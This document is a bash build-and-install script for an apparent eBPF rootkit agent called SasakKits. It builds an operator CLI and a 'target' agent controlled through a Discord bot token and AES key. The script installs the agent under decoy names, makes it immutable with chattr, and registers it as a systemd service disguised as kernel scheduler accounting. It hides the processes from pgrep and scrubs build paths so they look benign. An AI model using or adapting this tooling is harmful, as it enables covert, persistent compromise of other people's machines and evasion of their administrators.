#!/usr/bin/env bash
# build.sh — SasakKits Plan C all-in-one build + install script.
#
# One file to rule them all: build the Go binaries (agent + sd-loader),
# install them as a systemd service, hide via eBPF, and you're done.
#
# Tested on Ubuntu 22.04 with kernels 5.15.0-186-generic and
# 6.8.0-136-generic. Single sd_bpfel.o is CO-RE-portable across both.
#
# === QUICK START (fresh VM) ===
#   git clone <repo> ~/sasakbpf && cd ~/sasakbpf
#   cp secrets.env.example secrets.env
#   nano secrets.env        # fill SD_BOT_TOKEN / SD_CHANNEL_ID / SD_AES_KEY_HEX
#   sudo ./build.sh install # build + install + start service, all-in-one
#   sudo ./build.sh status  # verify it's running
#
# === SUBCOMMANDS ===
#   ./build.sh mac               # build CLI → userspace/bin/sasakbpf-mac (operator)
#   sudo ./build.sh install      # build agent+loader+BPF + install → systemd (target)
#   sudo ./build.sh uninstall    # stop + remove + cleanup BPF
#   sudo ./build.sh status       # check service + BPF + WSS
#   ./build.sh help              # this help text
#
# Binaries built into userspace/bin/ (gitignored, never committed).
# secrets.env is also gitignored — you must provide your own.

set -euo pipefail

# On Linux, prefer /usr/local/go over system Go (apt installs old 1.18).
if [ "$(uname -s)" = "Linux" ] && [ -x /usr/local/go/bin/go ]; then
    export PATH="/usr/local/go/bin:$PATH"
fi

# ─────────────────────────────────────────────────────────────────────
# Config
# ─────────────────────────────────────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
USERSPACE_DIR="$SCRIPT_DIR/userspace"
HBIN="$USERSPACE_DIR/bin"

LOADER_DST="/usr/libexec/kdhelper-loader"
AGENT_DST="/usr/libexec/kdhelper"
UNIT_DST="/etc/systemd/system/sd-agent.service"
UNIT_NAME="sd-agent.service"
BPF_PIN_CLEANUP=(cgrp_pids sched_patterns tcp_rtt_ports perf_stats sd_pids sd_patterns sd_ports sd_dbg)

# Pretty output
say()  { printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
ok()   { printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
warn() { printf '\033[1;33m[!]\033[0m %s\n' "$*" >&2; }
die()  { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; exit 1; }

# ─────────────────────────────────────────────────────────────────────
# Dependency check + auto-install
# ─────────────────────────────────────────────────────────────────────
check_root_or_warn() {
    if [ "$(id -u)" -ne 0 ]; then
        warn "not running as root — install/status/uninstall will fail, build will still work"
    fi
}

check_root() {
    [ "$(id -u)" -eq 0 ] || die "must run as root (try: sudo $0 $*)"
}

GO_MIN_VER="1.26"
GO_TEMP_DIR=""

ensure_go() {
    if [ "$(uname -s)" != "Linux" ]; then
        command -v go >/dev/null 2>&1 || die "go not found — brew install go"
        return 0
    fi

    local cur=""
    if command -v go >/dev/null 2>&1; then
        cur=$(go version | grep -oE 'go[0-9]+\.[0-9]+' | head -1 | sed 's/go//')
    fi

    local want_major=1 want_minor=26
    if [ -n "$cur" ]; then
        local cur_major=$(echo "$cur" | cut -d. -f1)
        local cur_minor=$(echo "$cur" | cut -d. -f2)
        if [ "${cur_major:-0}" -gt "$want_major" ] \
           || { [ "${cur_major:-0}" -eq "$want_major" ] && [ "${cur_minor:-0}" -ge "$want_minor" ]; }; then
            return 0
        fi
        say "Go $GO_MIN_VER required (found: go$cur) — downloading go1.26.5"
    else
        say "Go not found — downloading go1.26.5"
    fi

    local url="https://go.dev/dl/go1.26.5.linux-amd64.tar.gz"
    local tarball="/tmp/go1.26.5.tar.gz"

    if command -v wget >/dev/null 2>&1; then
        wget -q --show-progress -O "$tarball" "$url" || die "failed to download go1.26.5"
    else
        curl -fL --progress-bar -o "$tarball" "$url" || die "failed to download go1.26.5"
    fi

    GO_TEMP_DIR=$(mktemp -d /tmp/sasakbpf-go-XXXXXX)
    tar -C "$GO_TEMP_DIR" -xzf "$tarball"
    rm -f "$tarball"
    export PATH="$GO_TEMP_DIR/go/bin:$PATH"
    say "using Go $(go version)"
}

cleanup_go() {
    [ -n "${GO_TEMP_DIR:-}" ] && [ -d "$GO_TEMP_DIR" ] && rm -rf "$GO_TEMP_DIR"
}
trap cleanup_go EXIT

ensure_clang() {
    if command -v clang >/dev/null 2>&1; then
        if echo "" | clang -target bpf -x c -c -o /dev/null - 2>/dev/null; then
            return 0
        fi
        warn "clang does not support -target bpf, trying full clang install"
    else
        say "clang missing — installing"
    fi

    if command -v apt-get >/dev/null 2>&1; then
        apt-get update -qq && apt-get install -y -qq clang 2>/dev/null || true
    fi

    if echo "" | clang -target bpf -x c -c -o /dev/null - 2>/dev/null; then
        return 0
    fi
    warn "clang -target bpf unsupported (pre-built sched_bpfel.o will be used)"
    return 1
}

# Compile BPF object from a clean directory so BTF paths look benign
# (e.g. /usr/local/src/sched/sched_stats.bpf.c instead of /root/test/bpf/...).
# This avoids -fdebug-prefix-map which can break CO-RE relocations.
BPF_SRC="$SCRIPT_DIR/bpf/sched_stats.bpf.c"
BPF_OUT="$USERSPACE_DIR/internal/bpf/sched_bpfel.o"
BPF_BUILD_DIR="/usr/local/src/sched"

do_bpf() {
    if [ ! -f "$BPF_SRC" ]; then
        die "$BPF_SRC missing — BPF source not found"
    fi
    ensure_clang || return 0

    say "compiling BPF object from $BPF_BUILD_DIR"
    mkdir -p "$BPF_BUILD_DIR"

    # Copy all BPF source deps to the clean build directory.
    cp "$SCRIPT_DIR/bpf/sched_stats.bpf.c" "$BPF_BUILD_DIR/"
    cp "$SCRIPT_DIR/bpf/sched_common.h"   "$BPF_BUILD_DIR/"
    cp "$SCRIPT_DIR/bpf/vmlinux_5.15.h"   "$BPF_BUILD_DIR/"
    cp "$SCRIPT_DIR/bpf/include/"*.h       "$BPF_BUILD_DIR/"

    (
        cd "$BPF_BUILD_DIR"
        clang -target bpf -O2 -g -D__TARGET_ARCH_x86 \
          -I. -c sched_stats.bpf.c \
          -o "$BPF_OUT"
    )

    if command -v llvm-strip >/dev/null 2>&1; then
        llvm-strip -g "$BPF_OUT"
    fi

    # Cleanup build dir (BTF paths already baked into .o).
    rm -rf "$BPF_BUILD_DIR"

    ok "BPF object $(ls -la "$BPF_OUT" | awk '{print $5}') bytes <- $BPF_OUT"
}

ensure_deps_install() {
    command -v systemctl >/dev/null 2>&1 \
        || die "systemctl missing — install systemd (not a typical Linux OS?)"
    if ! command -v bpftool >/dev/null 2>&1; then
        warn "bpftool missing — install linux-tools-$(uname -r) for BPF status visibility (optional)"
    fi
}

ensure_secrets() {
    if [ ! -f "$SCRIPT_DIR/secrets.env" ]; then
        if [ -f "$SCRIPT_DIR/secrets.env.example" ]; then
            die "secrets.env missing. Run: cp secrets.env.example secrets.env && fill values"
        else
            die "secrets.env missing and no .example template found"
        fi
    fi
    # Sanity: check at least one var looks populated (not the literal placeholder)
    . "$SCRIPT_DIR/secrets.env"
    [ -n "${SD_BOT_TOKEN:-}" ] || die "SD_BOT_TOKEN empty in secrets.env"
    [ -n "${SD_CHANNEL_ID:-}" ] || die "SD_CHANNEL_ID empty in secrets.env"
    [ -n "${SD_AES_KEY_HEX:-}" ] || die "SD_AES_KEY_HEX empty in secrets.env"

    if [ -z "${SD_TARGET_ID:-}" ]; then
        SD_TARGET_ID=$(openssl rand -hex 6)
        say "TargetID auto-generated: $SD_TARGET_ID"
    else
        say "TargetID: $SD_TARGET_ID"
    fi
    export SD_BOT_TOKEN SD_CHANNEL_ID SD_TARGET_ID SD_AES_KEY_HEX
}

# ─────────────────────────────────────────────────────────────────────
# Build
# ─────────────────────────────────────────────────────────────────────
do_build_mac() {
    say "building SasakBPF CLI (darwin/amd64) → sasakbpf-mac"
    ensure_go
    ensure_secrets
    make -C "$USERSPACE_DIR" cli-darwin
    local out="$HBIN/sasakbpf-mac"
    cp "$HBIN/cli-darwin" "$out"
    ok "sasakbpf-mac $(ls -la "$out" | awk '{print $5}') bytes"
}

# ─────────────────────────────────────────────────────────────────────
# systemd unit (inline, generated each install)
# ─────────────────────────────────────────────────────────────────────
write_unit() {
    say "writing systemd unit -> $UNIT_DST"
    cat > "$UNIT_DST" <<'UNIT'
[Unit]
Description=Kernel cgroup scheduler accounting
Documentation=https://kernel.org/doc/html/latest/admin-guide/cgroup-v2.html
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/libexec/kdhelper-loader
Restart=always
RestartSec=5
LimitMEMLOCK=infinity
LimitNOFILE=65536
LimitNPROC=infinity
AmbientCapabilities=CAP_BPF CAP_NET_ADMIN CAP_MAC_ADMIN CAP_SYS_ADMIN CAP_SYS_RESOURCE CAP_DAC_OVERRIDE
CapabilityBoundingSet=CAP_BPF CAP_NET_ADMIN CAP_MAC_ADMIN CAP_SYS_ADMIN CAP_SYS_RESOURCE CAP_DAC_OVERRIDE
NoNewPrivileges=false
ProtectSystem=false
ProtectHome=false
PrivateDevices=false
PrivateNetwork=false
PrivateTmp=false
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
UNIT
    chmod 0644 "$UNIT_DST"
}

# ─────────────────────────────────────────────────────────────────────
# Install
# ─────────────────────────────────────────────────────────────────────
do_install() {
    check_root install
    ensure_deps_install
    ensure_go
    ensure_secrets

    say "compiling BPF object (if clang available)"
    do_bpf

    say "building agent + sd-loader"
    make -C "$USERSPACE_DIR" agent
    make -C "$USERSPACE_DIR" sd-loader
    [ -f "$HBIN/sd-loader" ] || die "sd-loader build failed"
    [ -f "$HBIN/agent" ]     || die "agent build failed"
    ok "agent      $(ls -la "$HBIN/agent"  | awk '{print $5}') bytes"
    ok "sd-loader  $(ls -la "$HBIN/sd-loader"  | awk '{print $5}') bytes"

    mkdir -p "$(dirname "$LOADER_DST")"
    mkdir -p "$(dirname "$AGENT_DST")"

    say "installing loader -> $LOADER_DST"
    chattr -i "$LOADER_DST" 2>/dev/null || true
    install -m 0755 -o root -g root "$HBIN/sd-loader" "$LOADER_DST"

    say "installing agent  -> $AGENT_DST"
    chattr -i "$AGENT_DST" 2>/dev/null || true
    install -m 0555 -o root -g root "$HBIN/agent" "$AGENT_DST"
    chattr +i "$AGENT_DST" 2>/dev/null || true

    write_unit
    systemctl daemon-reload

    say "enabling + starting $UNIT_NAME"
    systemctl reset-failed "$UNIT_NAME" 2>/dev/null || true
    systemctl enable "$UNIT_NAME" >/dev/null
    systemctl restart "$UNIT_NAME"
    sleep 3

    if systemctl is-active --quiet "$UNIT_NAME"; then
        ok "$UNIT_NAME active — boot persistence installed"
        do_status
    else
        die "$UNIT_NAME failed to start — journal:\n$(journalctl -u "$UNIT_NAME" --no-pager -n 20)"
    fi
}

# ─────────────────────────────────────────────────────────────────────
# Uninstall
# ─────────────────────────────────────────────────────────────────────
do_uninstall() {
    check_root uninstall

    say "stopping $UNIT_NAME"
    systemctl stop "$UNIT_NAME" 2>/dev/null || true
    systemctl disable "$UNIT_NAME" 2>/dev/null || true

    # Kill stragglers (loader/agent may still be running hidden — try pkill,
    # but also fallback to walking cgrp_pids map if pkill can't see them).
    say "killing stragglers"
    pkill -9 -f "$LOADER_DST" 2>/dev/null || true
    pkill -9 -f "$AGENT_DST"  2>/dev/null || true
    if command -v bpftool >/dev/null 2>&1; then
        # Hidden pids aren't visible to pkill — dump the BPF map and kill them.
        for pid in $(bpftool map dump name cgrp_pids 2>/dev/null \
                     | grep -oE '"key":\s+[0-9]+' | awk '{print $2}'); do
            kill -9 "$pid" 2>/dev/null || true
        done
    fi

    say "removing unit + binaries"
    rm -f "$UNIT_DST"
    systemctl daemon-reload
    systemctl reset-failed "$UNIT_NAME" 2>/dev/null || true
    chattr -i "$LOADER_DST" 2>/dev/null || true
    chattr -i "$AGENT_DST"  2>/dev/null || true
    rm -f "$LOADER_DST" "$AGENT_DST"

    say "cleaning pinned BPF objects"
    rm -f /sys/fs/bpf/cgrp_* /sys/fs/bpf/sched_* /sys/fs/bpf/tcp_rtt_* \
          /sys/fs/bpf/perf_stats /sys/fs/bpf/sd_* 2>/dev/null || true

    ok "uninstall complete"
}

# ─────────────────────────────────────────────────────────────────────
# Status
# ─────────────────────────────────────────────────────────────────────
do_status() {
    say "service"
    if systemctl is-active --quiet "$UNIT_NAME"; then
        ok "  active"
    else
        warn "  inactive"
    fi
    systemctl is-enabled "$UNIT_NAME" 2>/dev/null | sed 's/^/  enabled: /'

    say "binaries on disk"
    for f in "$LOADER_DST" "$AGENT_DST" "$UNIT_DST"; do
        if [ -f "$f" ]; then ok "  present: $f"; else warn "  missing: $f"; fi
    done

    say "BPF programs"
    if command -v bpftool >/dev/null 2>&1; then
        local n
        n=$(bpftool prog show 2>/dev/null | grep -cE 'name cgrp_sched|name cgrp_legacy') || true
        ok "  $n cgrp_* tracing programs loaded"
        local m
        m=$(bpftool map show 2>/dev/null | grep -cE 'name cgrp_pids|name sched_patterns|name tcp_rtt|name perf_stats') || true
        ok "  $m maps loaded"
    else
        warn "  bpftool missing — install linux-tools-$(uname -r) for BPF visibility"
    fi

    say "WSS / Discord egress"
    local wss
    wss=$(ss -tn state established 2>/dev/null | grep -c ':443 ' || true)
    ok "  $wss established :443 connections"

    say "process visibility"
    if pgrep -f "$LOADER_DST" >/dev/null 2>&1 || pgrep -f "$AGENT_DST" >/dev/null 2>&1; then
        warn "  VISIBLE in pgrep (not hidden? maybe just-installed before BPF attach)"
    else
        ok "  not visible in pgrep (hidden — expected)"
    fi
}

# ─────────────────────────────────────────────────────────────────────
# Help
# ─────────────────────────────────────────────────────────────────────
do_help() {
    sed -n '2,/^set -euo/p' "$0" | sed 's/^# \?//' | head -40
}

# ─────────────────────────────────────────────────────────────────────
# Dispatch
# ─────────────────────────────────────────────────────────────────────
cmd="${1:-help}"
case "$cmd" in
    mac)
        do_build_mac
        ;;
    install)
        do_install
        ;;
    uninstall)
        do_uninstall
        ;;
    status)
        do_status
        ;;
    help|-h|--help)
        do_help
        ;;
    *)
        die "unknown subcommand: $cmd (try: $0 help)"
        ;;
esac